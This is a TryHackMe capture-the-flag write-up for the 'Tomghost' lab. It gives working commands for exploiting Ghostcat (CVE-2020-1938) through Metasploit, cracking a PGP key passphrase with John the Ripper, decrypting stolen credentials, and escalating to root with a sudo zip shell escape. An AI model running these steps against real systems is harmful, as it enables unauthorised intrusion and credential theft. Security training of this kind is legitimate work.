# Tomghost - TryHackMe

Linux machine running Apache Tomcat 9.0.30 with the AJP connector exposed. The attack path exploits Ghostcat (CVE-2020-1938) to read local files and obtain PGP-encrypted credentials, cracks the key passphrase with John the Ripper, decrypts the credential file to pivot to a second user, then abuses a sudo `zip` misconfiguration via GTFOBins.

---

## Enumeration

### Network Scanning

```bash
nmap -sC -sV -p- 10.64.148.209
```

Open ports:

- 22/tcp - SSH (OpenSSH 7.2p2)
- 53/tcp - DNS (tcpwrapped)
- 8009/tcp - AJP13 (Apache Jserv Protocol)
- 8080/tcp - HTTP (Apache Tomcat 9.0.30)

Port 8009 running AJP alongside Tomcat 9.0.30 is the immediate signal: this version is vulnerable to Ghostcat (CVE-2020-1938).

---

## Initial Access

### Ghostcat (CVE-2020-1938)

Ghostcat is a file read/inclusion vulnerability in the AJP connector that allows reading arbitrary files from the Tomcat web application root:

```bash
msfconsole
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.64.148.209
set RPORT 8009
run
```

Reading files via AJP leads to sensitive credential material on the filesystem.

---

## Post-Exploitation - Credential Access

In the home directory of `skyfuck`:

```
credential.pgp
tryhackme.asc
```

- `credential.pgp` - PGP-encrypted file containing credentials
- `tryhackme.asc` - PGP private key, passphrase-protected

The workflow: crack the private key passphrase with John, import the key, decrypt the credential file.

### Cracking the PGP Key Passphrase

```bash
gpg2john tryhackme.asc > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

Passphrase recovered:

```
alexandru
```

### Decrypting the Credential File

```bash
gpg --import tryhackme.asc
gpg --decrypt credential.pgp
```

Enter passphrase `alexandru` when prompted. Output contains credentials for user `merlin`.

---

## Lateral Movement

```bash
ssh merlin@10.64.148.209
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

Output:

```
(root : root) NOPASSWD: /usr/bin/zip
```

### GTFOBins - zip

`zip` can be abused to spawn a shell when executed as root:

```bash
sudo zip -q /tmp/test.zip /etc/hosts -T -TT 'sh #'
```

Root shell obtained:

```
uid=0(root) gid=0(root)
```

---

## Flags

```
user.txt  -> /home/merlin/user.txt
root.txt  -> /root/root.txt
```

---

## Key Takeaways

- AJP on port 8009 alongside an unpatched Tomcat is an immediate Ghostcat indicator. Version detection alone is enough to triage the attack path without guessing.
- PGP/GPG artifacts found post-access are high-value targets. The chain is: encrypted file + private key + crack passphrase + decrypt = credentials for lateral movement.
- `gpg2john` extracts the crackable hash from the private key - the passphrase is what John cracks, not the encrypted file directly.
- `sudo -l` after gaining each new user context is mandatory. A single misconfigured binary entry (`zip` here) is enough for GTFOBins root.
- Encrypted credentials stored on a compromised host are not safe if the private key is also present - they are just two cracking steps away.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
